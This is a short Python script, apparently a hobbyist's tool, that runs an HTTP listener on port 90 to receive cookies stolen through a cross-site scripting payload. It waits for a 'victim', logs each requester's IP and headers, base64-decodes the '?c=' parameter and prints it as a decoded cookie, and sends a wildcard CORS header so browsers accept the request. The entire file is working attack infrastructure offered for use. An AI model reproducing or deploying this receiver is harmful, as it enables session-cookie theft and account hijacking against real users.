from http.server import HTTPServer, BaseHTTPRequestHandler
import base64


print("\033[91mXSS listener instead of netcat made by mee ZAIN\033[0m") 
print("Waiting for victim to trigger payload...\n")

class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
       
        print(f"\n\033[94m--- NEW REQUEST FROM {self.client_address[0]} ---\033[0m")
        print(f"Path: {self.path}")
        print("Headers:")
        print(self.headers)

        # AUTO DECODER FOR XSS
        # Agar URL mein '?c=' hai, to uske aage ka data decode karo
        if "?c=" in self.path:
            try:
                # URL se base64 wala part alag karna
                encoded_part = self.path.split("?c=")[1]
                # Decode karke print karna
                decoded_data = base64.b64decode(encoded_part).decode('utf-8')
                print(f"\033[92m[!!!] DECODED COOKIE: {decoded_data}\033[0m")
            except:
                print("\033[93m[!] Could not decode data (maybe not base64)\033[0m")

        # BROWSER RESPONSE
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*") # CORS bypass
        self.end_headers()
        self.wfile.write(b"OK")

    # Console ke faltu messages band karne ke liye
    def log_message(self, format, *args):
        return

# 2. Server setup
httpd = HTTPServer(('0.0.0.0', 90), SimpleHandler)
httpd.serve_forever()
